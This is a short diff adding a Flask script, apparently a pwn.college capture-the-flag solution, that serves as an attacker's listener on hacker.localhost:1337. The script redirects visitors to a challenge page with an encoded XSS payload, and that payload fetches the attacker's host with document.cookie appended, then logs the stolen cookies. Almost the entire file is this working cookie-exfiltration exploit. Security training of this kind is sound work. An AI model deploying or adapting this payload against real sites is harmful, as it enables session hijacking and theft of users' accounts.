@@ -1,0 +1,15 @@
+#!/opt/pwn.college/python
+
+import flask
+import os
+import requests
+
+app = flask.Flask(__name__)
+
+
+@app.route("/", methods=["GET"])
+def challenge():	
+	print(flask.request.url)
+	return flask.redirect('http://challenge.localhost/ephemeral?msg=}%3Cscript%3Efetch(new%20Request(`http://hacker.localhost:1337/${document.cookie}`))%3C/script%3E')
+
+app.run("hacker.localhost", 1337, debug=True)
